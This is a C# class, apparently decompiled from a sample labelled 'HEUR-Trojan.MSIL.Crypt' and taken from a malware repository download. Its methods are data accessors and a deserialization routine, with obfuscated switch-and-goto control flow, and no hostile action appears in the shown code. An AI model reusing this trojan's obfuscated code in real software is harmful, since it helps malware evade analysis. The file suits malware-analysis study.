// Decompiled with JetBrains decompiler
// Type: Tourield.Schemes.UtilsWrapper
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Pages;
using DebuggerTypeProxyAttrib.Templates;
using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using Tourield.Attributes;
using Tourield.Roles;
using Tourield.Workers;

namespace Tourield.Schemes
{
  public class UtilsWrapper : RefWorker
  {
    private string m_BridgeWrapper;
    private bool _StrategyWrapper;
    private string initializerWrapper;
    private string m_InstanceWrapper;
    private string _AuthenticationWrapper;
    private string _ItemWrapper;
    private int m_ReaderWrapper;
    private bool _DefinitionWrapper;
    private string m_IndexerWrapper;
    private BindingList<RegFactoryRole> m_InterpreterWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string ViewWrapper() => this.m_BridgeWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool ConcatWrapper() => this._StrategyWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string StartWrapper() => this.initializerWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string FlushWrapper() => this.m_InstanceWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string DisableWrapper() => this._AuthenticationWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string InvokeWrapper() => this._ItemWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public int CompareWrapper() => this.m_ReaderWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool IncludeWrapper()
    {
      int num1 = 4;
      bool definitionWrapper;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              goto label_5;
            case 1:
            case 2:
              goto label_6;
            case 3:
              goto label_1;
            case 5:
              goto label_8;
            default:
              if (true)
              {
                num2 = 1;
                continue;
              }
              goto label_5;
          }
        }
label_1:
        bool flag;
        if (!flag)
          break;
        goto label_6;
label_5:
        flag = this.m_ParamsWrapper >= 10;
        num1 = 3;
        continue;
label_6:
        definitionWrapper = this._DefinitionWrapper;
        num1 = 5;
      }
      throw new NotSupportedException();
label_8:
      return definitionWrapper;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string CollectWrapper()
    {
      int num1 = 1;
      string indexerWrapper;
      while (true)
      {
        int num2 = num1;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              flag = this.m_ParamsWrapper >= 11;
              num2 = 3;
              continue;
            case 2:
            case 4:
              goto label_2;
            case 3:
              goto label_3;
            case 5:
              goto label_8;
            default:
              goto label_6;
          }
        }
label_2:
        indexerWrapper = this.m_IndexerWrapper;
        num1 = 5;
        continue;
label_3:
        if (!flag)
          break;
        goto label_2;
label_6:
        num1 = 4;
      }
      throw new NotSupportedException();
label_8:
      return indexerWrapper;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public BindingList<RegFactoryRole> AssetWrapper()
    {
      if (this.m_InterpreterWrapper == null)
        this.m_InterpreterWrapper = new BindingList<RegFactoryRole>();
      return this.m_InterpreterWrapper;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool PrepareWrapper() => this.CalcWrapper() == (byte) 99;

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void RestartAdapter(TestsWrapperAttribute info)
    {
      int num1 = 2;
      while (true)
      {
        bool flag;
        int num2;
        switch (num1)
        {
          case 0:
            this._StrategyWrapper = info.OrderPrototype();
            this.initializerWrapper = info.ChangePrototype();
            this.m_InstanceWrapper = info.ChangePrototype();
            num2 = 6;
            break;
          case 1:
          case 4:
            this.m_IndexerWrapper = info.ChangePrototype();
            num2 = 7;
            break;
          case 2:
            this.m_BridgeWrapper = info.ChangePrototype();
            num2 = 0;
            break;
          case 3:
          case 5:
            if (flag)
            {
              num2 = 1;
              break;
            }
            goto label_13;
          case 6:
            this._AuthenticationWrapper = info.ChangePrototype();
            this._ItemWrapper = info.ChangePrototype();
            this.m_ReaderWrapper = info.FillPrototype();
            if (this.m_ParamsWrapper >= 10)
              this._DefinitionWrapper = info.OrderPrototype();
            flag = this.m_ParamsWrapper >= 11;
            goto case 3;
          case 7:
            goto label_12;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
      }
label_12:
      return;
label_13:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public UtilsWrapper(BroadcasterRulesTemplate key)
    {
      RegistryPagePage.ListMethod();
      // ISSUE: explicit constructor call
      base.\u002Ector(key);
    }

    internal static bool CollectMethod() => true;

    internal static bool RestartMethod() => false;
  }
}
